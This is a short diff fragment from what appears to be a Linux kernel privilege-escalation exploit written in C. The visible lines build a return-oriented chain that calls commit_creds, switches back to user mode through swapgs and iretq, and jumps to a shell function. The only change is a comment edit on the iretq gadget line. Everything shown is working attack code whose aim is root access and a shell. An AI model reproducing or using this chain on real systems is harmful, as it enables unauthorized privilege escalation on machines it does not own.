@@ -506,7 +506,7 @@ int main()
 	data[i++] = commit_creds;
 	data[i++] = swapgs_popfq_ret;	// swapgs; popfq; ret
 	data[i++] = user_rflags;	// rflags
-	data[i++] = iretq;		// iretq; ret;
+	data[i++] = iretq;		// iretq;
 	data[i++] = (size_t)shell;
 
 	data[i++] = user_cs;		// cs
